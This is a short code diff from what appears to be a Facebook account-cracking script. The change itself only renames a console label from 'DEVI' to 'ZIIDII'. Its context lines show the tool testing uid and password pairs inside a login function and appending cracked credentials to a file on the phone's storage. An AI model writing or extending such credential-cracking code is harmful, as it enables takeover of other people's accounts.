@@ -124,7 +124,7 @@ def login(uid):
                 oks.append(uid)
                 break 
             elif "www.facebook.com" in rp["error_msg"]:
-                print(f"\r\r\033[1;30m[\033[1;33mDEVI\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
+                print(f"\r\r\033[1;30m[\033[1;33mZIIDII\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                 open("/sdcard/ZIIDII-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
